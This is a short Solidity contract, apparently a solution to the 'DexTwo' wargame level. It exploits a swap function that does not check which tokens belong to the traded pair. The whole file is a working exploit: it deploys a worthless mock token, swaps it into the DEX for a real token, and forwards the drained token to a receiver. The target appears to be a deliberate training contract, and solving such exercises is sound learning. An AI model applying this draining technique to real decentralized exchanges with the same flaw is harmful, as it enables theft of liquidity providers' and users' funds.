// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {DexTwo, SwappableTokenTwo} from "./DexTwo.sol";

contract DexTwoAttacker {
    // Observation:
    // dex.swap doesnt check if the token is one of the correct pair
    function attack(DexTwo dex, address targetToken, uint256 amount, address receiver) external {
        // Create a fake new token
        SwappableTokenTwo mock = new SwappableTokenTwo(address(dex), "Mock", "MK1", type(uint256).max);

        // Approve dex usage
        mock.approve(address(dex), mock.balanceOf(address(this)));

        // Send some to the dex and swap for a "real" token
        mock.transfer(address(dex), amount);
        dex.swap(address(mock), targetToken, amount);

        // Send to receiver
        IERC20(targetToken).transfer(receiver, amount);
    }
}
